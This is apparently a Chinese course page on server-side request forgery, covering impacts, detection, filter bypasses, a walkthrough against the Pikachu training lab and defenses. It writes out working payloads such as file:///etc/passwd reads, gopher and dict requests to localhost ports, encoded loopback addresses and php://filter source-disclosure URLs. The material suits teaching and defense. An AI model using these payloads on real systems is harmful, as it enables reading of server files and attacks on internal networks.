---
slug: /net-security/09/03
---

👉 课件 PDF：[SSRF&XXE&远程代码执行](./SSRF%20&%20XXE%20&%20Remote%20Code%20Execution.pdf)



## 简介

服务端请求伪造（SSRF，Server-Side Request Forgery），由攻击者造成，在服务器发起请求的漏洞。



![](http://img.wukaipeng.com/2023/11/04-102221-image-20231104102221145.png)

### 原理

原理是服务端本身发起了请求，但是没有对该请求做合理的过滤和校验。



### 危害

1️⃣ 扫描内网开放服务

2️⃣ 向内网任意主机的任意端口发送 payload 来进行攻击内网服务

3️⃣ DOS 攻击（比如请求大文件、Keep-Alive Always）

4️⃣ 利用内网的 Web 应用，执行 SQL 注入、XSS 攻击等

5️⃣ 利用 file、gopher、dict 协议读取本地文件、执行命令等



## 检测与绕过

### 漏洞检测

假设有一个场景，某网站支持在线加载功能，把指定的一张远程图片下载到本地：

```
http://www.xxx.com/image.php?image=http://www.xxc.com/a.jpg
```

服务端大致步骤：

👍 用户输入地址

✌️ 服务端接受请求

🤟 根据请求参数下载远程图片

👊 将图片发送给前端



这里潜在的漏洞点是用户输入的地址：

```
# 使用回环地址
http://www.xxx.com/image.php?image=http://127.0.0.1:22

# 使用不同协议
http://www.xxx.com/image.php?image=file:///etc/passwd
http://www.xxx.com/image.php?image=dict://127.0.0.1:22/data:data2 (dict可以向服务端
口请求data data2)
http://www.xxx.com/image.php?image=gopher://127.0.0.1:2233/_test (向2233端口发送数
据test,同样可以发送POST请求)
.....
```



### 漏洞出现点

🎯 **分享**

通过 URL 地址分享文章，比如 `http://share.wukaipeng.com/index.php?url=http://127.0.0.1`

🎯 **图片加载与下载**

通过 URL 地址加载或下载图片，比如 `http://image.wukaipeng.com/image.php?image=http://127.0.0.1`

🎯 **图片、文章收藏功能**

`http://title.wukaipeng.com/title?title=http://title.geektime.com/as52ps63de`



### 漏洞绕过

🚔 限制域名为 `http://www.example.com` 域名时

尝试使用 HTTP 基本身份认证的方式绕过，通过添加 @ 来构造 URL：`http://www.example.com@www.another_example.com`，在对 @ 解析域名时，不同的处理函数存在处理差异，例如 `http://www.aaa.com@www.bbb.com@www.ccc.com`，PHP 的 `parse_url()` 会识别为   `www.ccc.com`，而 `libcurl` 则识别为 `www.bbb.com`

🚔 限制请求不为内网地址（黑名单）

第一种方式：采用短网址绕过

第二种方式：转换进制

将 `127.0.0.1` 转换成其他进制：

- 八进制：0177.0.0.1
- 十六进制：0x7f.0.0.1
- 十进制：2130706433

![](http://img.wukaipeng.com/2023/11/05-091343-image-20231105091343351.png)

🚔 限制只为 HTTP 协议，不能是 `file` 等其他协议

采用短网址，比如要访问 `192.168.1.1`，用短网址生成 `https://short.com/abcd`

### 查看是否存在漏洞

1. 排除法：浏览器控制台查看源代码是否在本地发起了请求
2. [Dnslog](http://dnslog.cn/) 等工具测试，查看是否被访问

3. 抓包分析。用 WireShark 抓包分析。
4. 访问日志检查。请求请求发送到自己控制的公网服务器，然后检查自己公网服务器的日志
5. 扫描工具



## Pikachu 演示

### SSRF（curl）

打开 SSRF 模块：

![](http://img.wukaipeng.com/2023/11/05-094651-image-20231105094651038.png)

观察 URL：

![](http://img.wukaipeng.com/2023/11/05-094611-image-20231105094611484.png)

> 注意，这里 Pikachu 平台有一个 bug，url 参数双写了 `/vul`，要去掉一个

我们可以修改该链接：

![](http://img.wukaipeng.com/2023/11/05-094901-image-20231105094901129.png)

也可以用其他协议：

![](http://img.wukaipeng.com/2023/11/05-094957-image-20231105094957393.png)

### SSRF（file_get_contents）

`file_get_contents()` 函数将一整个文件作为字符串读入。

`php://filter` 是一种元封装器，用于数据流打开时的筛选过滤应用。👉 [php 文档](https://www.php.net/manual/zh/wrappers.php.php#:~:text=php%3A%2F%2Ffilter%20php%3A%2F%2Ffilter%20%E6%98%AF%E4%B8%80%E7%A7%8D%E5%85%83%E5%B0%81%E8%A3%85%E5%99%A8%EF%BC%8C%20%E8%AE%BE%E8%AE%A1%E7%94%A8%E4%BA%8E%E6%95%B0%E6%8D%AE%E6%B5%81%E6%89%93%E5%BC%80%E6%97%B6%E7%9A%84%20%E7%AD%9B%E9%80%89%E8%BF%87%E6%BB%A4%20%E5%BA%94%E7%94%A8%E3%80%82%20%E8%BF%99%E5%AF%B9%E4%BA%8E%E4%B8%80%E4%BD%93%E5%BC%8F%EF%BC%88all-in-one%EF%BC%89%E7%9A%84%E6%96%87%E4%BB%B6%E5%87%BD%E6%95%B0%E9%9D%9E%E5%B8%B8%E6%9C%89%E7%94%A8%EF%BC%8C%E7%B1%BB%E4%BC%BC%20readfile,%E3%80%81%20file%20%28%29%20%E5%92%8C%20file_get_contents%20%28%29%20%EF%BC%8C%20%E5%9C%A8%E6%95%B0%E6%8D%AE%E6%B5%81%E5%86%85%E5%AE%B9%E8%AF%BB%E5%8F%96%E4%B9%8B%E5%89%8D%E6%B2%A1%E6%9C%89%E6%9C%BA%E4%BC%9A%E5%BA%94%E7%94%A8%E5%85%B6%E4%BB%96%E8%BF%87%E6%BB%A4%E5%99%A8%E3%80%82)

访问 SSRF（file_get_contents）模块，得到 URL：

`http://YOUR_ADDRESS_IP:PORT/vul/ssrf/ssrf_fgc.php?file=http://127.0.0.1/vul/ssrf/ssrf_info/info2.php`

![](http://img.wukaipeng.com/2023/11/05-101842-image-20231105101842735.png)

改为：

`http://YOUR_IP_ADDRESS:PORT/vul/ssrf/ssrf_fgc.php?file=php://filter/resource=ssrf.php`

![](http://img.wukaipeng.com/2023/11/05-101933-image-20231105101933538.png)

这里其实我们已经得到了 `ssrf.php` 的文件，但是我们并不希望它被解析，而是希望拿到 `ssrf.php` 的源码，做法是先把它加密成 base64，然后再解密，修改 URL 为：

`http://175.178.126.31:8083/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-
encode/resource=ssrf.php`

![](http://img.wukaipeng.com/2023/11/05-102212-image-20231105102212467.png)

用 [Base64 解密工具](https://t.he3app.com/dt46) 解密得到：

```php
<?php
/**
 * Created by runner.han
 * There is nothing new under the sun
 */


$SELF_PAGE = substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+1);

if ($SELF_PAGE = "ssrf.php"){
    $ACTIVE = array('','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','active open','active','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','');
}

$PIKA_ROOT_DIR =  "../../";
include_once $PIKA_ROOT_DIR.'header.php';






?>


<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li>
                    <i class="ace-icon fa fa-home home-icon"></i>
                    <a href="ssrf.php"></a>
                </li>
                <li class="active">概述</li>
            </ul>
        </div>
        <div class="page-content">

         <b>SSRF(Server-Side Request Forgery:服务器端请求伪造)</b>
         <p>其形成的原因大都是由于服务端<b>提供了从其他服务器应用获取数据的功能</b>,但又没有对目标地址做严格过滤与限制</p>
            导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据<br>
            <br>
            数据流:攻击者----->服务器---->目标地址<br>
            <br>
            根据后台使用的函数的不同,对应的影响和利用方法又有不一样
            <pre style="width: 500px;">
PHP中下面函数的使用不当会导致SSRF:
file_get_contents()
fsockopen()
curl_exec()
            </pre><br>
            如果一定要通过后台服务器远程去对用户指定("或者预埋在前端的请求")的地址进行资源请求,<b>则请做好目标地址的过滤</b>。
<br>
            <br>

            你可以根据"SSRF"里面的项目来搞懂问题的原因

        </div><!-- /.page-content -->
    </div>
</div><!-- /.main-content -->



<?php
include_once $PIKA_ROOT_DIR . 'footer.php';

?>
```



## 防御

1️⃣ 设置 URL 白名单或者内网 IP 黑名单

2️⃣ 过滤返回信息

3️⃣ 禁用非必须协议。比如仅 允许 http 和 https 协议，其他 file、gopher、ftp 一律禁用（协议白名单）。

















